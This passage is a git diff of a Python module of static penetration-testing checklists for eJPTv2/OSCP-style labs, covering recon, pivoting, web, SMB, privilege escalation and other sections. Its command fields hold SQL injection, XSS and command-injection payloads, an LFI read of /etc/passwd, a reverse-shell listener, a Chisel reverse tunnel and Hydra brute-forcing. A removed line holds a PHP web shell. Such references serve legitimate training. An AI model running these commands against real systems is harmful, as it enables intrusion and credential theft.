@@ -1,4 +1,4 @@
-"""Static methodology templates for CYB0X-S checklists.
+"""Static methodology templates and tactical command references for CYB0X-S.
 
 These templates represent standard manual penetration testing methodologies commonly
 utilized in eJPTv2, OSCP, and lab assessments (curated from community best practices).
@@ -9,224 +9,630 @@ They contain zero dynamic code, zero adaptive algorithms, and zero autonomous sc
 
 from __future__ import annotations
 
-from typing import Dict, List, Optional
+from typing import Any, Dict, List, Optional
 from cyb0x_s.models import ChecklistItem, ChecklistStatus
 
-STATIC_TEMPLATES: Dict[str, Dict[str, any]] = {
+STATIC_TEMPLATES: Dict[str, Dict[str, Any]] = {
     "ejpt": {
         "category": "EJPTv2 MASTER METHODOLOGY",
         "description": "Complete eJPTv2 multi-phase assessment workflow (Recon → Foothold → Pivoting → PrivEsc)",
         "items": [
-            "1. [Scope & Recon] Verify subnet scope, assigned IP address, and default gateway",
-            "2. [Host Discovery] Scan live hosts using arp-scan / fping / ping sweep",
-            "3. [Port Discovery] TCP full SYN port scan against live targets (`nmap -p- -sS -T4`)",
-            "4. [Service & Version Detection] Run service detection and default scripts (`nmap -sC -sV -O`)",
-            "5. [Low-Hanging Fruit] Test anonymous FTP, null SMB sessions, default web logins, SNMP public string",
-            "6. [Web Enumeration] Identify tech stack, fuzz directories/files, inspect source comments, review robots.txt",
-            "7. [Vulnerability Analysis] Match software versions against known CVEs manually (SearchSploit, Exploit-DB)",
-            "8. [Foothold] Execute verified manual exploit or valid credentials to obtain initial shell",
-            "9. [Host Recon] Run local enumeration (`id`, `whoami /priv`, network interfaces, routing table)",
-            "10. [Pivoting Check] Check for secondary NICs / internal subnets (`ip a`, `ifconfig`, `arp -a`, `netstat`)",
-            "11. [Routing & Tunneling] Set up route / socks proxy (Metasploit autoroute, SSH -D, Chisel) if secondary subnet found",
-            "12. [Internal Host Discovery] Scan internal targets through pivot tunnel (`proxychains nmap -sT -Pn`)",
-            "13. [Privilege Escalation] Elevate to root or NT AUTHORITY\\SYSTEM using local misconfigurations",
-            "14. [Flag & Proof Capture] Document proof commands (`whoami`, `ip a`/`ipconfig`, flags) and take screenshots",
-        ],
-    },
-    "discovery": {
-        "category": "NETWORK & HOST DISCOVERY",
-        "description": "Standard host discovery and network mapping methodology",
-        "items": [
-            "Identify local network interface and routing table (`ip a`, `ip route`, `route -n`)",
-            "Perform ARP sweep on the local subnet (`arp-scan --localnet` or `netdiscover -r <subnet>`)",
-            "Perform ICMP ping sweep across target range (`fping -a -g <subnet> 2>/dev/null`)",
-            "Inspect TTL values to guess OS (TTL ~64 = Linux/Unix, TTL ~128 = Windows)",
-            "Run fast TCP port discovery on discovered live hosts (`nmap -sn` / `nmap -F`)",
-            "Identify dual-homed machines, routers, and default gateways",
-            "Record all discovered live IP addresses as targets in worksheet",
-        ],
-    },
-    "web": {
-        "category": "WEB APPLICATION TESTING",
-        "description": "Standard web application manual testing methodology (OWASP & eJPTv2 focus)",
-        "items": [
-            "Inspect HTTP response headers, cookies, and server banners (`curl -I`, WhatWeb, Wappalyzer)",
-            "Review robots.txt, sitemap.xml, crossdomain.xml, and security.txt",
-            "Review HTML source code and client-side JavaScript for comments, hidden inputs, and paths",
-            "Run directory and file fuzzing (Gobuster / Feroxbuster / Dirsearch with common.txt or raft wordlists)",
-            "Test virtual hosts and subdomain routing (Gobuster vhost fuzzing / `Host:` header manipulation)",
-            "Test administrative endpoints for default credentials (e.g. `admin:admin`, `admin:password`)",
-            "Inspect authentication, session management, and cookies (HttpOnly, Secure, SameSite flags)",
-            "Test input parameters for SQL Injection (manual quotes `'`, `--`, OR 1=1, then sqlmap if confirmed)",
-            "Test parameters for Path Traversal / Local File Inclusion (`../../../../etc/passwd`, `win.ini`)",
-            "Test input reflection for Cross-Site Scripting (Reflected / Stored XSS `<script>alert(1)</script>`)",
-            "Test input fields for OS Command Injection (`; id`, `| whoami`, `$(whoami)`)",
-            "Test file upload forms (extension bypass `.php5`, `.phtml`, double extensions, MIME-type tampering)",
-            "Scan CMS installations if applicable (WPScan for WordPress, Droopescan for Drupal, Joomscan)",
-            "Inspect API endpoints, REST routes, and Swagger / OpenAPI documentation",
-        ],
-    },
-    "smb": {
-        "category": "SMB ENUMERATION",
-        "description": "SMB & Windows file sharing enumeration methodology",
-        "items": [
-            "Check SMB protocol dialect support and SMB signing requirement (`crackmapexec smb <IP>` / `nxc smb`)",
-            "Test anonymous / guest null session authentication (`smbclient -N -L //<IP>/`)",
-            "List accessible shares and verify read / write permissions on each share",
-            "Recursively inspect accessible shares for backups, scripts, `.config`, `.xml`, or `.zip` files",
-            "Run comprehensive SMB enumeration (`enum4linux-ng -A <IP>` or `enum4linux -a <IP>`)",
-            "Enumerate domain and local user accounts via RPC / SAMR (`rpcclient -U '' <IP>` with `enumdomusers`)",
-            "Perform RID cycling to discover valid usernames (`crackmapexec smb <IP> -u '' -p '' --rid-brute`)",
-            "Inspect domain password policy (lockout threshold, minimum password length)",
-            "Check for named pipes accessibility (e.g. `samr`, `lsarpc`, `spoolss`)",
-        ],
-    },
-    "ftp": {
-        "category": "FTP ENUMERATION",
-        "description": "File Transfer Protocol enumeration and inspection checklist",
-        "items": [
-            "Check banner and exact FTP server version (check for vsftpd 2.3.4 backdoor or known CVEs)",
-            "Test anonymous login (`ftp <IP>` with username `anonymous` and blank/email password)",
-            "List all files including hidden files (`ls -la` in FTP prompt)",
-            "Check if binary mode is required for binary/executable transfers (`binary`)",
-            "Download all discovered configuration files, source code, or credential archives",
-            "Test write permissions in FTP root and subdirectories (`put test.txt`)",
-            "If writable and web server serves the FTP directory, test uploading web shell (`shell.php`)",
-            "Test brute-forcing user credentials using Hydra (`hydra -L users.txt -P rockyou.txt ftp://<IP>`)",
-        ],
-    },
-    "ssh": {
-        "category": "SSH ENUMERATION",
-        "description": "Secure Shell configuration and credential testing checklist",
-        "items": [
-            "Inspect OpenSSH banner and version (check for user enumeration CVEs like OpenSSH < 7.7)",
-            "Verify allowed authentication methods (Password, Publickey, Keyboard-interactive)",
-            "Test root login permission (`ssh root@<IP>`)",
-            "Test any discovered credentials or default accounts (`admin`, `user`, `test`, `guest`)",
-            "Inspect harvested private keys (`id_rsa`), verify permissions (`chmod 600 id_rsa`), and test login",
-            "If private key is passphrase-protected, convert and crack with John (`ssh2john.py id_rsa > hash`)",
-            "Test password spraying or targeted brute-force with Hydra if account names are known",
-        ],
-    },
-    "snmp": {
-        "category": "SNMP ENUMERATION",
-        "description": "SNMP (UDP 161) community string and MIB enumeration checklist",
-        "items": [
-            "Verify UDP port 161 is open using nmap (`nmap -sU -p 161 -sV <IP>`)",
-            "Brute-force community strings using wordlist (`onesixtyone -c /usr/share/seclists/... <IP>`)",
-            "Test default community strings: `public`, `private`, `manager`, `community`",
-            "Query system MIB table (`snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1` or `snmp-check <IP>`)",
-            "Enumerate running host processes (`snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2`)",
-            "Enumerate installed software (`snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2`)",
-            "Enumerate system network interfaces and IP addresses (`snmpwalk -v2c -c public <IP> ipAddrTable`)",
-            "Enumerate listening network ports and services (`snmpwalk -v2c -c public <IP> tcpConnTable`)",
-            "Enumerate local user accounts (`snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25`)",
-        ],
-    },
-    "databases": {
-        "category": "DATABASE SERVICES",
-        "description": "Database enumeration checklist (MySQL 3306, MSSQL 1433, PostgreSQL 5432)",
-        "items": [
-            "Check database service banner and authentication requirements",
-            "Test default administrative accounts (MySQL: `root` with blank password, MSSQL: `sa`)",
-            "Test discovered system/web credentials against database ports",
-            "List accessible databases, tables, and columns (`SHOW DATABASES;`, `SELECT name FROM master..sysdatabases;`)",
-            "Dump user password hashes and credentials from database tables",
-            "Check MySQL file read capability (`SELECT LOAD_FILE('/etc/passwd');`)",
-            "Check MySQL file write / web shell capability (`SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '...';`)",
-            "Check MSSQL command execution capability (`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`)",
-            "Check for database User Defined Functions (UDF) privilege escalation avenues",
+            {
+                "title": "1. Scope & Subnet Recon",
+                "command": "ip a && ip route && route -n",
+                "tip": "Verify assigned IP, subnet mask, interface names, and default gateway.",
+            },
+            {
+                "title": "2. Host Discovery",
+                "command": "arp-scan --localnet && fping -a -g <TARGET_SUBNET> 2>/dev/null",
+                "tip": "Identify all active machines, routers, and gateway IPs on the local segment.",
+            },
+            {
+                "title": "3. Port Discovery (TCP Full)",
+                "command": "nmap -p- -sS -T4 <TARGET_IP>",
+                "tip": "Run a full TCP SYN scan across all 65,535 ports to identify all open services.",
+            },
+            {
+                "title": "4. Service & Version Detection",
+                "command": "nmap -sC -sV -O -p <PORTS> <TARGET_IP>",
+                "tip": "Run default scripts and version probing on all confirmed open ports.",
+            },
+            {
+                "title": "5. Low-Hanging Fruit Inspection",
+                "command": "ftp <TARGET_IP> (anon) | smbclient -N -L //<TARGET_IP>/ | onesixtyone -c public <TARGET_IP>",
+                "tip": "Check anonymous FTP, null SMB sessions, SNMP public community strings, default logins.",
+            },
+            {
+                "title": "6. Web Tech & Directory Fuzzing",
+                "command": "whatweb http://<TARGET_IP> && feroxbuster -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt",
+                "tip": "Review robots.txt, HTML comments, login portals, and hidden directories/files.",
+            },
+            {
+                "title": "7. Manual Vulnerability Analysis",
+                "command": "searchsploit \"<SERVICE_BANNER>\"",
+                "tip": "Match exact software banners against known CVEs and verified exploit code.",
+            },
+            {
+                "title": "8. Initial Foothold",
+                "command": "nc -lvnp 4444",
+                "tip": "Execute verified manual exploit or valid login credentials to get initial shell.",
+            },
+            {
+                "title": "9. Local Host Recon",
+                "command": "id && whoami /priv && ip a && route print",
+                "tip": "Inspect current user context, assigned privileges, network interfaces, routing.",
+            },
+            {
+                "title": "10. Pivoting & Secondary NICs",
+                "command": "ip a | ifconfig | arp -a | netstat -antup",
+                "tip": "Check for secondary network adapters, internal subnets, and listening internal services.",
+            },
+            {
+                "title": "11. Routing & Tunnel Setup",
+                "command": "route add <SUBNET> <MASK> <SESSION> | ssh -D 1080 -N -f user@<IP>",
+                "tip": "Configure Metasploit autoroute + SOCKS5, or SSH dynamic forwarding / Chisel.",
+            },
+            {
+                "title": "12. Internal Target Scanning",
+                "command": "proxychains -q nmap -sT -Pn -n -p 21,22,80,445 <INTERNAL_IP>",
+                "tip": "Scan internal hosts through SOCKS5 proxy tunnel (TCP connect scan).",
+            },
+            {
+                "title": "13. Privilege Escalation",
+                "command": "sudo -l | find / -perm -u=s 2>/dev/null | whoami /priv",
+                "tip": "Elevate to root (Linux) or NT AUTHORITY\\SYSTEM (Windows) via local misconfigurations.",
+            },
+            {
+                "title": "14. Proof & Flag Capture",
+                "command": "whoami && ip a && cat proof.txt / type proof.txt",
+                "tip": "Execute proof command, capture flag hash, and record screenshot reference.",
+            },
         ],
     },
     "pivoting": {
         "category": "PIVOTING & ROUTING (eJPTv2)",
         "description": "Dual-homed host discovery, routing table setup, and pivot tunneling methodology",
         "items": [
-            "Inspect compromised host network interfaces (`ip a`, `ifconfig`, `ipconfig /all`)",
-            "Identify secondary internal subnets (e.g. `192.168.x.x`, `10.x.x.x`) not reachable directly",
-            "Inspect routing table and default gateway (`ip route`, `route -n`, `route print`)",
-            "Inspect local ARP cache for neighbors on internal subnets (`ip neigh`, `arp -a`)",
-            "Perform internal host discovery from compromised host (ping sweep bash loop or ping.exe)",
-            "Metasploit route method: add route in msfconsole (`route add <internal_subnet> <netmask> <session_id>`)",
-            "Metasploit SOCKS proxy: launch `auxiliary/server/socks_proxy` (port 1080, SOCKS5)",
-            "SSH dynamic tunnel: set up SOCKS proxy via SSH (`ssh -D 1080 -N -f user@<foothold_IP>`)",
-            "Chisel tunnel: run chisel server on attacker (`chisel server -p 8000 --reverse`) and client on victim",
-            "Configure `/etc/proxychains4.conf` to point to `socks5 127.0.0.1 1080` (ensure `quiet_mode` is enabled)",
-            "Scan internal target through tunnel (`proxychains -q nmap -sT -Pn -n -p 21,22,80,445,3389 <internal_IP>`)",
-            "Access internal web applications through browser (configure Firefox proxy to `127.0.0.1:1080`)",
-            "Exploit internal target through proxy tunnel (`proxychains smbclient`, `proxychains crackmapexec`)",
+            {
+                "title": "1. Identify Secondary NICs",
+                "command": "ip a | ifconfig | ipconfig /all",
+                "tip": "Check for dual-homed network cards and internal subnets not directly accessible.",
+            },
+            {
+                "title": "2. Inspect Routing Table",
+                "command": "ip route | route print",
+                "tip": "Determine default gateways and internal subnet routing paths.",
+            },
+            {
+                "title": "3. Inspect ARP Neighbors",
+                "command": "arp -a | ip neigh",
+                "tip": "Examine known host IPs on the secondary network interface.",
+            },
+            {
+                "title": "4. Ping Sweep Internal Subnet",
+                "command": "for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i & done",
+                "tip": "Run a fast bash loop ping sweep from compromised host to discover live IPs.",
+            },
+            {
+                "title": "5. Metasploit Route Addition",
+                "command": "route add 192.168.1.0 255.255.255.0 <SESSION_ID>",
+                "tip": "Add internal subnet route inside msfconsole to route traffic through session.",
+            },
+            {
+                "title": "6. Metasploit SOCKS5 Proxy",
+                "command": "use auxiliary/server/socks_proxy; set SRVPORT 1080; set VERSION 5; run",
+                "tip": "Launch local SOCKS5 proxy to bridge host OS tools into pivot network.",
+            },
+            {
+                "title": "7. SSH Dynamic Port Forwarding",
+                "command": "ssh -D 1080 -N -f user@<TARGET_IP>",
+                "tip": "Create clean SOCKS5 proxy via SSH if SSH credentials or keys are compromised.",
+            },
+            {
+                "title": "8. Reverse Chisel Tunnel",
+                "command": "chisel server -p 8000 --reverse (attacker) / chisel client <IP>:8000 R:1080:socks (victim)",
+                "tip": "Fast standalone tunneling when SSH or Metasploit is not viable.",
+            },
+            {
+                "title": "9. Configure /etc/proxychains4.conf",
+                "command": "echo \"socks5 127.0.0.1 1080\" >> /etc/proxychains4.conf",
+                "tip": "Ensure quiet_mode is un-commented to avoid proxy spam in tool outputs.",
+            },
+            {
+                "title": "10. Scan Internal Pivot Target",
+                "command": "proxychains -q nmap -sT -Pn -n -p 21,22,80,445 <INTERNAL_IP>",
+                "tip": "Always use TCP Connect (-sT) and skip ping (-Pn) when scanning through proxies.",
+            },
+            {
+                "title": "11. Web Browsing via Pivot",
+                "command": "FoxyProxy -> SOCKS5 127.0.0.1:1080",
+                "tip": "Configure browser proxy to browse internal web applications through the tunnel.",
+            },
+            {
+                "title": "12. Exploit Pivot Services",
+                "command": "proxychains smbclient -N -L //<INTERNAL_IP>/",
+                "tip": "Execute exploitation tools through proxychains against internal machines.",
+            },
+        ],
+    },
+    "web": {
+        "category": "WEB APPLICATION TESTING",
+        "description": "Standard web application manual testing methodology (OWASP & eJPTv2 focus)",
+        "items": [
+            {
+                "title": "1. Server Banner & Tech Stack",
+                "command": "whatweb -a 3 http://<TARGET_IP>",
+                "tip": "Identify web server, scripting language, CMS, and reverse proxy headers.",
+            },
+            {
+                "title": "2. Robots & Site Metadata",
+                "command": "curl -s http://<TARGET_IP>/robots.txt",
+                "tip": "Check robots.txt, sitemap.xml, crossdomain.xml, and security.txt.",
+            },
+            {
+                "title": "3. HTML & JavaScript Source",
+                "command": "curl -s http://<TARGET_IP> | grep -iE \"TODO|admin|password|api\"",
+                "tip": "Review client-side comments, hidden input fields, and script endpoints.",
+            },
+            {
+                "title": "4. Directory & File Fuzzing",
+                "command": "feroxbuster -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak",
+                "tip": "Search for administrative portals, upload endpoints, and backup files.",
+            },
+            {
+                "title": "5. Virtual Host Enumeration",
+                "command": "gobuster vhost -u http://<TARGET_IP> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+                "tip": "Test for distinct virtual hosts routing via Host: header manipulation.",
+            },
+            {
+                "title": "6. Default Admin Credentials",
+                "command": "admin:admin | admin:password | root:root | test:test",
+                "tip": "Test common default credentials on discovered login forms.",
+            },
+            {
+                "title": "7. Cookie & Session Attributes",
+                "command": "curl -I http://<TARGET_IP>",
+                "tip": "Inspect Set-Cookie headers for missing HttpOnly, Secure, or SameSite flags.",
+            },
+            {
+                "title": "8. SQL Injection Testing",
+                "command": "' OR 1=1-- | ' UNION SELECT NULL,NULL--",
+                "tip": "Fuzz all GET/POST input parameters for SQL error reflection and boolean bypass.",
+            },
+            {
+                "title": "9. Path Traversal & LFI",
+                "command": "curl http://<TARGET_IP>/page.php?file=../../../../etc/passwd",
+                "tip": "Test file include parameters with null bytes (%00) and traversal sequences.",
+            },
+            {
+                "title": "10. Cross-Site Scripting (XSS)",
+                "command": "<script>alert(document.cookie)</script> | <img src=x onerror=alert(1)>",
+                "tip": "Check if user input is reflected unsanitized in the HTML response body.",
+            },
+            {
+                "title": "11. OS Command Injection",
+                "command": "; id | | whoami | $(id) | `id`",
+                "tip": "Test command execution in pingers, form formatters, and export features.",
+            },
+            {
+                "title": "12. File Upload Bypass",
+                "command": "Upload shell.php5 / shell.phtml / shell.phar / double extension shell.jpg.php",
+                "tip": "Bypass client-side checks, tamper Content-Type, and test execution paths.",
+            },
+            {
+                "title": "13. CMS Scanning",
+                "command": "wpscan --url http://<TARGET_IP> --enumerate u,vp,vt",
+                "tip": "Enumerate WordPress/Drupal plugins, themes, and vulnerable components.",
+            },
+            {
+                "title": "14. API & Swagger Endpoints",
+                "command": "curl http://<TARGET_IP>/api/v1/swagger.json",
+                "tip": "Inspect REST APIs, JSON endpoints, and IDOR access control boundaries.",
+            },
+        ],
+    },
+    "smb": {
+        "category": "SMB ENUMERATION",
+        "description": "SMB & Windows file sharing enumeration methodology",
+        "items": [
+            {
+                "title": "1. SMB Dialect & Signing",
+                "command": "crackmapexec smb <TARGET_IP> / nxc smb <TARGET_IP>",
+                "tip": "Identify SMB version, computer name, domain name, and signing requirement.",
+            },
+            {
+                "title": "2. Anonymous Null Session",
+                "command": "smbclient -N -L //<TARGET_IP>/",
+                "tip": "Test anonymous share listing without supplying any credentials.",
+            },
+            {
+                "title": "3. Share Read/Write Permissions",
+                "command": "smbclient -N //<TARGET_IP>/<SHARE_NAME>",
+                "tip": "Connect to shares and verify read, write, and directory traversal permissions.",
+            },
+            {
+                "title": "4. Search Shares for Data",
+                "command": "recurse ON; prompt OFF; mget *.txt *.conf *.bak *.zip",
+                "tip": "Download discovered configuration files, scripts, and archives.",
+            },
+            {
+                "title": "5. Comprehensive Enum4Linux",
+                "command": "enum4linux-ng -A <TARGET_IP>",
+                "tip": "Extract users, groups, password policy, shares, and OS build details.",
+            },
+            {
+                "title": "6. User Enum via RPC",
+                "command": "rpcclient -U '' <TARGET_IP> -c \"enumdomusers; querydispinfo\"",
+                "tip": "Query local and domain users via null RPC session.",
+            },
+            {
+                "title": "7. RID Cycling Brute-Force",
+                "command": "crackmapexec smb <TARGET_IP> -u '' -p '' --rid-brute 1000",
+                "tip": "Enumerate usernames by brute-forcing relative security identifiers (RIDs).",
+            },
+            {
+                "title": "8. Domain Password Policy",
+                "command": "crackmapexec smb <TARGET_IP> --pass-pol",
+                "tip": "Inspect lockout threshold and duration before attempting password spraying.",
+            },
+        ],
+    },
+    "discovery": {
+        "category": "NETWORK & HOST DISCOVERY",
+        "description": "Standard host discovery and network mapping methodology",
+        "items": [
+            {
+                "title": "1. Local Network Inspection",
+                "command": "ip a && ip route && route -n",
+                "tip": "Determine attacker IP, CIDR subnet, and default gateway.",
+            },
+            {
+                "title": "2. Local ARP Sweep",
+                "command": "arp-scan --localnet",
+                "tip": "Identify live hosts on layer 2 without generating TCP packets.",
+            },
+            {
+                "title": "3. ICMP Ping Sweep",
+                "command": "fping -a -g <TARGET_SUBNET> 2>/dev/null",
+                "tip": "Fast asynchronous ping sweep to discover responsive IP addresses.",
+            },
+            {
+                "title": "4. OS Guess via TTL",
+                "command": "ping -c 1 <TARGET_IP>",
+                "tip": "TTL around 64 indicates Linux/Unix; TTL around 128 indicates Windows.",
+            },
+            {
+                "title": "5. Fast TCP Port Discovery",
+                "command": "nmap -F <TARGET_IP>",
+                "tip": "Quick scan of the top 100 ports for rapid triage.",
+            },
+            {
+                "title": "6. Identify Gateways & Routers",
+                "command": "traceroute -n <TARGET_IP>",
+                "tip": "Map network hops and locate firewalls or multi-homed devices.",
+            },
         ],
     },
     "linux": {
         "category": "LINUX ENUMERATION",
         "description": "Standard manual Linux host enumeration and privilege escalation checklist",
         "items": [
-            "OS release and kernel version (`uname -a`, `cat /etc/os-release`, `cat /etc/issue`)",
-            "Current user context and group memberships (`id`, `groups`, `whoami`)",
-            "Sudo privileges and rules (`sudo -l`)",
-            "SUID / SGID executables (`find / -perm -u=s -type f 2>/dev/null`)",
-            "Capabilities on local binaries (`getcap -r / 2>/dev/null`)",
-            "Listening network services and ports (`ss -tulpn` or `netstat -antup`)",
-            "Active processes and background tasks (`ps aux | grep root`, pspy)",
-            "System cron jobs and timers (`cat /etc/crontab`, `/etc/cron.*`, `crontab -l`, `systemctl list-timers`)",
-            "World-writable files and directories (`find / -writable -type d 2>/dev/null`)",
-            "Unmounted file systems and fstab (`cat /etc/fstab`, `lsblk`)",
-            "SSH keys, history files, and config leaks (`~/.ssh`, `~/.bash_history`)",
-            "Readable `/etc/shadow` or writable `/etc/passwd`",
-            "Plaintext credentials in web files (`/var/www/html/`, `wp-config.php`)",
-            "NFS exports with `no_root_squash` (`cat /etc/exports`)",
+            {
+                "title": "1. User Context & Groups",
+                "command": "id && groups && whoami",
+                "tip": "Check if user is in sudo, wheel, docker, lxd, or adm groups.",
+            },
+            {
+                "title": "2. Kernel & OS Distribution",
+                "command": "uname -a && cat /etc/os-release",
+                "tip": "Check kernel version for dirtycow, overlayfs, or known kernel exploits.",
+            },
+            {
+                "title": "3. Sudo Privileges",
+                "command": "sudo -l",
+                "tip": "Inspect allowed sudo commands; check GTFOBins for privilege escalation bypasses.",
+            },
+            {
+                "title": "4. SUID / SGID Binaries",
+                "command": "find / -perm -u=s -type f 2>/dev/null",
+                "tip": "Cross-reference unusual SUID binaries on GTFOBins.",
+            },
+            {
+                "title": "5. Linux Capabilities",
+                "command": "getcap -r / 2>/dev/null",
+                "tip": "Look for binaries with cap_setuid, cap_dac_read_search, or cap_sys_admin.",
+            },
+            {
+                "title": "6. Scheduled Cron Jobs",
+                "command": "cat /etc/crontab /etc/cron.* && crontab -l",
+                "tip": "Check for user-writable scripts executing periodically as root.",
+            },
+            {
+                "title": "7. Listening Internal Ports",
+                "command": "ss -tulpn || netstat -antup",
+                "tip": "Check for internal database or management ports bound to 127.0.0.1.",
+            },
+            {
+                "title": "8. Running Root Processes",
+                "command": "ps aux | grep root",
+                "tip": "Look for custom background daemons or scripts executed by root.",
+            },
+            {
+                "title": "9. Writable /etc/passwd or shadow",
+                "command": "ls -l /etc/passwd /etc/shadow",
+                "tip": "If /etc/passwd is writable, append a root user with custom salt.",
+            },
+            {
+                "title": "10. Plaintext Credential Leaks",
+                "command": "cat ~/.bash_history && grep -ri \"password\" /var/www/html/ 2>/dev/null",
+                "tip": "Search bash history and web config files (wp-config.php, database.php) for passwords.",
+            },
+            {
+                "title": "11. NFS No Root Squash",
+                "command": "cat /etc/exports",
+                "tip": "Check for exported shares configured with no_root_squash.",
+            },
         ],
     },
     "windows": {
         "category": "WINDOWS ENUMERATION",
         "description": "Standard manual Windows host enumeration and privilege escalation checklist",
         "items": [
-            "OS name, build, and architecture (`systeminfo`)",
-            "Current user, SID, and assigned privileges (`whoami /all`, `whoami /priv`)",
-            "Check for Impersonate privileges (`SeImpersonatePrivilege` -> PrintSpoofer/GodPotato)",
-            "Local and domain user accounts (`net user`, `net localgroup administrators`)",
-            "Installed software and patches (`wmic qfe`, PowerShell `Get-HotFix`)",
-            "Running processes and loaded modules (`tasklist /v`)",
-            "Active network connections and routes (`netstat -ano`, `route print`)",
-            "Service permissions and unquoted service paths (`accesschk.exe`, `wmic service`)",
-            "Scheduled tasks and autoruns (`schtasks /query /fo LIST /v`)",
-            "AlwaysInstallElevated registry settings inspection",
-            "Saved credentials and DPAPI blobs (`cmdkey /list`, Vault)",
-            "Stored plaintext passwords in unattend files (`Unattend.xml`, `sysprep.inf`)",
+            {
+                "title": "1. User Privileges & Tokens",
+                "command": "whoami /priv && whoami /groups",
+                "tip": "Look for SeImpersonatePrivilege or SeAssignPrimaryToken (PrintSpoofer / GodPotato).",
+            },
+            {
+                "title": "2. OS Build & Hotfixes",
+                "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"System Type\"",
+                "tip": "Identify Windows build number and check for missing security updates.",
+            },
+            {
+                "title": "3. Unquoted Service Paths",
+                "command": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /v \"C:\\Windows\\\"",
+                "tip": "Check if unquoted paths contain spaces and user-writable directories.",
+            },
+            {
+                "title": "4. Service Permissions",
+                "command": "accesschk.exe -uwcqv \"Authenticated Users\" * / sc qc <service>",
+                "tip": "Check if service configuration (binpath) can be modified by current user.",
+            },
+            {
+                "title": "5. AlwaysInstallElevated",
+                "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+                "tip": "If 0x1, craft an MSI payload with msfvenom to execute as SYSTEM.",
+            },
+            {
+                "title": "6. Scheduled Tasks",
+                "command": "schtasks /query /fo LIST /v",
+                "tip": "Look for custom scheduled tasks executing as SYSTEM with writable binaries.",
+            },
+            {
+                "title": "7. Windows Credential Manager",
+                "command": "cmdkey /list",
+                "tip": "If saved credentials exist, execute commands as target user via runas /savecred.",
+            },
+            {
+                "title": "8. AutoLogon Registry Passwords",
+                "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+                "tip": "Check for DefaultPassword, DefaultUserName, and AltDefaultPassword values.",
+            },
+            {
+                "title": "9. Unattend / Sysprep Files",
+                "command": "dir /s /b C:\\Unattend.xml C:\\sysprep.inf C:\\sysprep.xml",
+                "tip": "Search for plaintext administrative credentials in deployment answer files.",
+            },
         ],
     },
-    "privesc": {
-        "category": "PRIVILEGE ESCALATION",
-        "description": "Cross-platform privilege escalation checklist (Linux & Windows low-hanging fruit)",
+    "ftp": {
+        "category": "FTP ENUMERATION",
+        "description": "File Transfer Protocol enumeration and inspection checklist",
         "items": [
-            "[Linux] Sudo rights (`sudo -l`) and GTFOBins check",
-            "[Linux] SUID binaries (`find / -perm -u=s -type f 2>/dev/null`)",
-            "[Linux] Writable cron jobs or systemd services",
-            "[Linux] Stored credentials in bash history or web configs",
-            "[Windows] `whoami /priv` for SeImpersonate / SeBackupPrivilege",
-            "[Windows] Unquoted service paths and weak service permissions",
-            "[Windows] AlwaysInstallElevated registry settings",
-            "[Windows] Saved credentials in `cmdkey /list`",
+            {
+                "title": "1. Banner & Version Probing",
+                "command": "nc -vn <TARGET_IP> 21",
+                "tip": "Check for vsftpd 2.3.4 backdoor or ProFTPD known CVE vulnerabilities.",
+            },
+            {
+                "title": "2. Anonymous Authentication",
+                "command": "ftp <TARGET_IP> (username: anonymous, password: blank)",
+                "tip": "Check if anonymous read access is permitted.",
+            },
+            {
+                "title": "3. List Hidden Files",
+                "command": "ls -la",
+                "tip": "Inspect all files including hidden dotfiles and nested directories.",
+            },
+            {
+                "title": "4. Download Configurations",
+                "command": "binary && mget *",
+                "tip": "Download discovered backup files, source code, and credentials in binary mode.",
+            },
+            {
+                "title": "5. Test Write / Upload Permissions",
+                "command": "put test.txt",
+                "tip": "If writable and FTP root maps to web server, upload a web shell.",
+            },
+            {
+                "title": "6. Online Password Brute-Force",
+                "command": "hydra -L users.txt -P rockyou.txt ftp://<TARGET_IP>",
+                "tip": "Brute-force FTP credentials with Hydra if valid usernames are known.",
+            },
+        ],
+    },
+    "ssh": {
+        "category": "SSH ENUMERATION",
+        "description": "Secure Shell configuration and credential testing checklist",
+        "items": [
+            {
+                "title": "1. Banner & Version CVEs",
+                "command": "nc -vn <TARGET_IP> 22",
+                "tip": "Inspect OpenSSH banner; check for user enumeration CVEs.",
+            },
+            {
+                "title": "2. Root Login Permission",
+                "command": "ssh root@<TARGET_IP>",
+                "tip": "Check if root login is permitted with password authentication.",
+            },
+            {
+                "title": "3. Harvested Private Key Test",
+                "command": "chmod 600 id_rsa && ssh -i id_rsa user@<TARGET_IP>",
+                "tip": "Always ensure 0600 permissions before testing discovered private keys.",
+            },
+            {
+                "title": "4. Passphrase Cracking",
+                "command": "ssh2john.py id_rsa > hash && john --wordlist=rockyou.txt hash",
+                "tip": "If private key is encrypted with passphrase, crack using John.",
+            },
+            {
+                "title": "5. Credential Spraying",
+                "command": "hydra -L users.txt -P passwords.txt ssh://<TARGET_IP> -t 4",
+                "tip": "Test discovered credentials against SSH service with low thread count.",
+            },
+        ],
+    },
+    "snmp": {
+        "category": "SNMP ENUMERATION",
+        "description": "SNMP (UDP 161) community string and MIB enumeration checklist",
+        "items": [
+            {
+                "title": "1. Community String Brute-Force",
+                "command": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET_IP>",
+                "tip": "Brute-force community strings; test public, private, manager, community.",
+            },
+            {
+                "title": "2. System Information MIB",
+                "command": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.1",
+                "tip": "Extract OS banner, hostname, contact, and system uptime.",
+            },
+            {
+                "title": "3. Running Process Tree",
+                "command": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2",
+                "tip": "List all active processes running on the target machine.",
+            },
+            {
